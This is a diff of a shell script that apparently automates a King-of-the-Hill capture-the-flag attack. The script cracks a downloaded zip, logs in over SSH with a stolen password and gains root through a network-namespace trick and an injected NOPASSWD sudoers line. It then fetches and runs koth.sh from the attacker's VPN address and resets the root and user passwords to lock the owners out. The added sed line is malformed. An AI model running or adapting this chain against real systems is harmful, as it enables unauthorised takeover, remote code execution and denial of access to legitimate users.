@@ -49,7 +49,7 @@ fi
 
 wget --ftp-user=anonymous --ftp-password='' "ftp://$IP:$FTP_PORT/.../.../.I_saved_it_harry.zip" && mv .I_saved_it_harry.zip file.zip 
 
-PASSWORD=$(fcrackzip -v -u -D -p "$Wordlist" file.zip | grep -o 'PASSWORD FOUND!!!!   pw ==  ".*"' | cut -d '"' -f 2)
+PASSWORD=$(fcrackzip -v -u -D -p "$Wordlist" file.zip | grep -o '== [a-zA-Z0-9]*$' | awk '{print $2}')
 
 unzip -P $PASSWORD file.zip 
 
@@ -59,13 +59,14 @@ vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
 sshpass -p "$ssh_pass" ssh -o StrictHostKeychecking=no neville@"$IP" -p "$SSH_PORT" << EOF
 
-    ip netns add foo && ip netns exec foo /bin/sh -p
-
+    ip netns add foo && ip netns exec foo sed -i '/^#includedir \/etc\/sudoers.d/a bobba ALL=(ALL) NOPASSWD: /bin/su' {} \;
+    sleep 1
+    sudo su
+    echo "$username" >> /root/king.txt
     cd /boot && wget http://$vpn/Scripts/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
-    echo "$new_password" | passwd --stdin root
-    echo "$new_password" | passwd --stdin neville
-    echo "$new_password" | passwd --stdin draco
-    echo "$new_password" | passwd --stdin harry
-    echo "$new_password" | passwd --stdin hermione
-
+    echo "root:$new_password" | chpasswd
+    echo "neville:$new_password" | chpasswd
+    echo "draco:$new_password" | chpasswd
+    echo "harry:$new_password" | chpasswd
+    echo "hermione:$new_password" | chpasswd
 EOF
